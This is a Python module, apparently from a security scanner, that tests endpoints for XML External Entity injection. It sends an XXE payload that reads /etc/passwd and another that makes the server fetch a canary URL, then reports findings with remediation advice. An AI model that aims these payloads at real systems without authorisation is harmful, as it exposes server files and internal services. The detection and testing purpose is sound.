from ..core.models import Finding
from ..core.canary import Canary
from .base import Module


# Signature of /etc/passwd content leaking into the response
PASSWD_SIGS = ["root:x:0:0", "root:*:0:0", "daemon:x:1:1"]


def file_disclosure_payload(file_path: str = "/etc/passwd") -> bytes:
    return f'''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>'''.encode()


def ssrf_payload(url: str) -> bytes:
    return f'''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "{url}">
]>
<root>&xxe;</root>'''.encode()


class XxeModule(Module):
    name = "xxe"
    description = "Detect XML External Entity injection"
    author = "you"
    severity = "high"

    def _probe(self, target: str) -> bool:
        """Send a benign XML request to confirm the endpoint parses XML."""
        benign = b'<?xml version="1.0"?><root>umani-probe</root>'
        try:
            _, res = self.http.post(
                target,
                body=benign,
                headers={"Content-Type": "application/xml"},
            )
        except Exception:
            return False
        # accept 2xx, 4xx, 5xx — anything that isn't a connection failure
        return res.status > 0

    def _send_xml(self, target: str, payload: bytes):
        return self.http.post(
            target,
            body=payload,
            headers={"Content-Type": "application/xml"},
        )

    def run(self, target: str) -> list[Finding]:
        findings = []

        if not self._probe(target):
            return findings

        # --- Test 1: file disclosure ---
        payload = file_disclosure_payload("/etc/passwd")
        try:
            req, res = self._send_xml(target, payload)
            body = res.body.decode("utf-8", errors="ignore")
            if any(sig in body for sig in PASSWD_SIGS):
                findings.append(Finding(
                    name="XXE: file disclosure (/etc/passwd)",
                    severity="critical",
                    url=target,
                    param=None,
                    evidence=(
                        "Payload included <!ENTITY xxe SYSTEM "
                        '"file:///etc/passwd">\n'
                        "Response contained /etc/passwd content "
                        "(signature: root:x:0:0)."
                    ),
                    description=(
                        "The XML parser resolves external entities and "
                        "returns file contents. An attacker can read any "
                        "file the server process can access — SSH keys, "
                        "config files, source code, /etc/shadow."
                    ),
                    remediation=(
                        "Disable external entity resolution in the XML "
                        "parser. Use defusedxml. Reject DTDs entirely if "
                        "not needed."
                    ),
                    module=self.name,
                    cvss=9.1,
                    scan_id=req.scan_id,
                    request_id=req.id,
                ))
        except Exception:
            pass

        # --- Test 2: SSRF via XXE (canary callback) ---
        canary = Canary(host="127.0.0.1",)
        canary.start()
        try:
            payload = ssrf_payload(canary.url)
            try:
                req2, res2 = self._send_xml(target, payload)
            except Exception:
                req2, res2 = None, None

            if canary.hits():
                findings.append(Finding(
                    name="XXE: SSRF via external entity",
                    severity="high",
                    url=target,
                    param=None,
                    evidence=(
                        f"Entity URL: {canary.url}\n"
                        f"Canary received {len(canary.hits())} hit(s) "
                        f"from {canary.hits()[0]['client']}"
                    ),
                    description=(
                        "The XML parser fetched an attacker-supplied URL. "
                        "This allows reaching internal services and cloud "
                        "metadata endpoints from the server."
                    ),
                    remediation=(
                        "Disable external entity resolution. Block outbound "
                        "requests from XML parsers. Use defusedxml."
                    ),
                    module=self.name,
                    cvss=8.6,
                    scan_id=req2.scan_id if req2 else 0,
                    request_id=req2.id if req2 else None,
                ))
        finally:
            canary.stop()

        return findings
